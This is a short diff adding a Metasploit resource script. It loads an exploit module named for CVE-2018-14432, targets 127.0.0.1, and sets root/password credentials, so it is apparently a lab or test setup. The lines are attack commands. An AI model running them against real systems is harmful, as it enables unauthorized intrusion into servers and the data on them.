@@ -1,0 +1,4 @@
+use exploit/multi/http/cve_2018_14432
+set RHOST 127.0.0.1
+set USERNAME root
+set PASSWORD password
